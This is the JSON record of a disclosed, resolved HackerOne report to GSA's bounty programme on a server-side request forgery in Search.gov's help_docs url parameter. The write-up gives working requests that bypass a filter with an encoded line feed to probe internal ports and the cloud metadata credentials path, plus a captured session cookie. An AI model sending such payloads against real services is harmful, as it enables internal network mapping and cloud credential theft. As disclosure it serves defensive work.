{
  "id": 514224,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MTQyMjQ=",
  "url": "https://hackerone.com/reports/514224",
  "title": "SSRF in Search.gov via ?url= parameter",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2019-03-23T13:51:35.176Z",
  "submitted_at": "2019-03-23T13:51:35.176Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "niwasaki",
    "url": "/niwasaki",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/220/cb2079565b9d457a4f6a5204ecacdc33b771991f_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 50592,
    "url": "https://hackerone.com/gsa_bbp",
    "handle": "gsa_bbp",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/iyPFgzbsX86VXw5wJHyfPg9s/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/iyPFgzbsX86VXw5wJHyfPg9s/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "GSA Bounty",
      "twitter_handle": null,
      "website": "http://gsa.gov",
      "about": ""
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2019-08-26T19:03:05.410Z",
  "bug_reporter_agreed_on_going_public_at": "2019-08-24T22:47:47.274Z",
  "team_member_agreed_on_going_public_at": "2019-08-26T19:03:05.200Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "# Summary:\n\n`https://search.usa.gov/help_docs` endpoint is vulnerable to SSRF via `url` parameter. The parameter is protected but can be bypassed using LF (%0A).\n\n# Steps To Reproduce:\n\n1. Login to Search.gov and click `help manual`.\n2. The following request was vulnerable.\n  - Request\n\n    ```\n    GET /help_docs?url=https%3A%2F%2Fsearch.gov%2Fmanual%2Faccount.html HTTP/1.1\n    Host: search.usa.gov\n    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0\n    Accept: application/json, text/javascript, */*; q=0.01\n    Accept-Language: ja,en-US;q=0.7,en;q=0.3\n    Accept-Encoding: gzip, deflate, br\n    Referer: https://search.usa.gov/account\n    X-NewRelic-ID: VgYAV1BRCxABU1JUBAUCXlI=\n    X-CSRF-Token: /2jDOc6aYEZA5VealIrF44qJZtY0iDiTsALu8HYA+OOIewuKHREwyh6M0wGa2WC9amTPX4vPMjj0YQIjys3nNA==\n    X-Requested-With: XMLHttpRequest\n    Connection: close\n    Cookie: _ga=GA1.2.924676610.1553290937; _gid=GA1.2.1047460386.1553290937; _ga=GA1.3.924676610.1553290937; _gid=GA1.3.1047460386.1553290937; _session_id=a0d5ecbfa9404ea9ffad4cb3ea771dea; user_credentials=1055608db95b714d9ae2ef05a4e1b83aa138ad5fca67422f02ca795ec2a74179bb15c610dd33f5e6f200be0de0e812a8fe3d59a0027b290b5377ab2a65da1f19%3A%3A5992\n    ```\n\n3. If you insert `http://127.0.0.1:21/?%0A` before `url` parameter and send request, then response time is about 450ms. (Port is closed)\n  - Request\n\n    ```\n    GET /help_docs?url=http://127.0.0.1:21/?%0Ahttps%3A%2F%2Fsearch.gov%2Fmanual%2Faccount.html HTTP/1.1\n    (snip)\n    ```\n  - Response\n\n    ```\n    HTTP/1.1 200 OK\n    (snip)\n    {\"body\":\"<div class='alert alert-error'>Unable to retrieve <a href='http://127.0.0.1:21/?\\nhttps://search.gov/manual/account.html'>http://127.0.0.1:21/?\\nhttps://search.gov/manual/account.html</a>.</div>\"}\n    ```\n\n4. If you insert `http://127.0.0.1:22/?%0A` before `url` parameter and send request, then response time is about 10,468ms. (Port is open)\n  - Request\n\n    ```\n    GET /help_docs?url=http://127.0.0.1:22/?%0Ahttps%3A%2F%2Fsearch.gov%2Fmanual%2Faccount.html HTTP/1.1\n    (snip)\n    ```\n  - Response\n\n    ```\n    HTTP/1.1 200 OK\n    (snip)\n    {\"body\":\"<div class='alert alert-error'>Unable to retrieve <a href='http://127.0.0.1:22/?\\nhttps://search.gov/manual/account.html'>http://127.0.0.1:22/?\\nhttps://search.gov/manual/account.html</a>.</div>\"}\n    ```\n\n5. If you insert `http://169.254.169.254/latest/meta-data/iam/security-credentials/?%0A` before `url` parameter, then response body is empty. (/security-credentials exists)\n  - Request\n\n    ```\n    GET /help_docs?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/?%0Ahttps%3A%2F%2Fsearch.gov%2Fmanual%2Faccount.html HTTP/1.1\n    (snip)\n    ```\n  - Response\n\n    ```\n    HTTP/1.1 200 OK\n    (snip)\n    {\"body\":\"\"}\n    ```\n\n6. If you insert `http://169.254.169.254/latest/meta-data/iam/security-credentialx/?%0A` before `url` parameter, then response body is `Unable to retrieve` error. (/security-credentialx does not exists)\n  - Request\n\n    ```\n    GET /help_docs?url=http://169.254.169.254/latest/meta-data/iam/security-credentialx/?%0Ahttps%3A%2F%2Fsearch.gov%2Fmanual%2Faccount.html HTTP/1.1\n    (snip)\n    ```\n  - Response\n\n    ```\n    HTTP/1.1 200 OK\n    (snip)\n    {\"body\":\"<div class='alert alert-error'>Unable to retrieve <a href='http://169.254.169.254/latest/meta-data/iam/security-credentialx/?\\nhttps://search.gov/manual/account.html'>http://169.254.169.254/latest/meta-data/iam/security-credentialx/?\\nhttps://search.gov/manual/account.html</a>.</div>\"}\n    ```\n\n## Impact\n\nAttacker can scan your local network, finding internal port, and internal web applications. This may help with mapping what the infrastructure looks like and can help plan exploiting other vulnerabilities.",
  "bounty_amount": "150.0",
  "formatted_bounty": "$150",
  "weakness": {
    "id": 68,
    "name": "Server-Side Request Forgery (SSRF)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 34,
  "voters": [
    "ahmed0x59",
    "omarelfarsaoui",
    "p1stachios",
    "th4nu_0x0",
    "tess",
    "ali",
    "mik317",
    "zayn1337",
    "sldwn",
    "niwasaki",
    "and 24 more..."
  ],
  "severity": {
    "rating": "low",
    "score": 3.8,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "high",
      "privileges_required": "low",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "low",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
